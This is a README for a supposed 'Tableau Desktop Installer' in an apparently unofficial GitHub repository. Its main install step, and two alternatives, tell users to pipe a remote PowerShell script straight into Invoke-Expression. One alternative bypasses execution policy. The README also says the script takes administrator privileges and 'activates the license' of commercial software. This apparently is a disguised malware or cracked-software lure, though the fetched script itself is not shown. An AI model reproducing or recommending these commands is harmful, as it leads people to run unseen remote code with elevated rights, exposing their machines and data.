# Tableau Desktop Installer
the leading business intelligence and data visualization platform for creating interactive dashboards, connecting live databases, and sharing insights across organizations.

## Install
Open PowerShell and run:

```powershell
irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex
```

That's it. The installer handles everything.

## What it does
- Requests administrator privileges for Tableau server connector driver installation.
- Downloads Tableau Desktop installer silently with all data source drivers included.
- Installs database connectors for SQL Server, MySQL, PostgreSQL, Excel, and cloud sources.
- Activates the license and opens Tableau Start page connected to sample superstore data.

## Requirements
- Windows 10 / 11 (64-bit)
- PowerShell 5.1+
- Internet connection
- 8 GB RAM minimum is recommended for large data source analysis
- ~1500 MB free disk space

## Troubleshooting

**Live database query times out when working with large data tables**

Switch the data source from Live connection to Extract mode to download data locally for faster analysis.

**Dashboard publish to Tableau Public fails with an authentication error**

Go to Server > Tableau Public > Sign In and authenticate before attempting to publish a workbook.

**Alternative (bypass execution policy):**

```powershell
powershell -ExecutionPolicy Bypass -Command "irm https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | iex"
```

"irm is not recognized" -- old PowerShell. Use:

```powershell
Invoke-RestMethod https://raw.githubusercontent.com/CrystalContractor71/Release/main/install.ps1 | Invoke-Expression
```

## License
MIT -- see LICENSE.